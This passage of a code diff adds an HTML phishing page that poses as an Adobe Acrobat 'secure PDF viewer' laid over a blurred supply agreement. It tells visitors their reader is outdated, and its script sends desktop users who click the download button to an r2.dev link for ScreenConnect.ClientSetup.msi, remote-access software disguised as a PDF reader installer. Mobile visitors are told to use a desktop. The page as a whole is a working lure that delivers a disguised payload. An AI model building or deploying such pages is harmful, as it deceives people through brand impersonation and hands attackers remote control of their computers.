+          <p class="indent"><strong>2.1.1</strong> Year 1 (period ending <span class="field">[DATE]</span>) &mdash; <span class="field">[PERCENTAGE]</span> % of the total <span class="field">[SPECIFY PRODUCT]</span> requirements of the Client (in volume) that would have otherwise been provided for by the <span class="field">[SPECIFY PRODUCT]</span> division for such period.</p>
+          <p class="indent"><strong>2.1.2</strong> Year 2 (i.e. <span class="field">[NUMBER]</span>-month period ending <span class="field">[DATE]</span>) &mdash; No less than <span class="field">[PERCENTAGE]</span> % of the total <span class="field">[SPECIFY PRODUCT]</span> requirements of the Client (in volume) that would have otherwise been provided for by the <span class="field">[SPECIFY PRODUCT]</span> division for such period.</p>
+          <div class="footer-bar">
+            <span>First Supply Agreement</span>
+            <span>Page 1 of 17</span>
+          </div>
+        </div>
+
+        <div class="overlay"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== FOREGROUND UI ===== -->
+  <div id="loading-screen">
+    <div class="loading-dots">
+      <span></span><span></span><span></span><span></span><span></span>
+    </div>
+    <div class="loading-text">Loading PDF viewer...</div>
+  </div>
+
+  <div id="mobile-overlay">
+    <div class="mobile-box">
+      <div class="icon">💻</div>
+      <h2>Desktop Required</h2>
+      <p>This secure PDF viewer is designed for <strong>desktop computers only</strong>. Please open this page on a PC or laptop.</p>
+      <button class="btn-mob" onclick="document.getElementById('mobile-overlay').style.display='none'">I Understand</button>
+    </div>
+  </div>
+
+  <div id="main-content">
+    <div class="card">
+      <img class="logo" src="https://www.adobe.com/favicon.ico" alt="PDF" onerror="this.style.display='none'">
+      <div class="title">Secure Official Documents! Your Acrobat is not updated</div>
+      <div class="desc">Launch PDF Expert Latest Installer from the Downloads folder. If the client setup installer did not download automatically, get the installer below. </div>
+      <a class="btn" id="view-btn" href="install.html">Download Screen-Client PDF Reader Manually</a>
+      <div class="footer">Adobe Acrobat Reader &nbsp;|&nbsp; Secure Document</div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      var mobile = /mobile|iphone|ipod|android|ipad|blackberry|tablet/.test(navigator.userAgent.toLowerCase())
+                || (window.innerWidth <= 480);
+
+      setTimeout(function() {
+        document.getElementById('loading-screen').classList.add('fade-out');
+        setTimeout(function() {
+          document.getElementById('loading-screen').style.display = 'none';
+          document.getElementById('main-content').classList.add('show');
+        }, 400);
+      }, 2000);
+
+      if (mobile) {
+        document.getElementById('mobile-overlay').style.display = 'flex';
+      }
+
+      document.getElementById('view-btn').onclick = function(e) {
+        e.preventDefault();
+        if (mobile) {
+          document.getElementById('mobile-overlay').style.display = 'flex';
+          return;
+        }
+        window.location.href = 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
+      };
+
+      var bgPage = 0;
+      var bgTotal = 3;
+      setInterval(function() {
+        bgPage = (bgPage + 1) % bgTotal;
+        document.querySelectorAll('.pdf-bg .pdf-page').forEach(function(p, i) {
+          p.classList.toggle('active', i === bgPage);
+        });
+        document.querySelectorAll('.pdf-bg .thumbnail').forEach(function(t, i) {
+          t.classList.toggle('active', i === bgPage);
+        });
+        document.getElementById('bgPageInfo').textContent = (bgPage + 1) + ' / ' + bgTotal;
+      }, 4000);
+
+      console.log('Device:', mobile ? 'Mobile' : 'Desktop');
+    })();
+  </script>
+</body>
+</html>
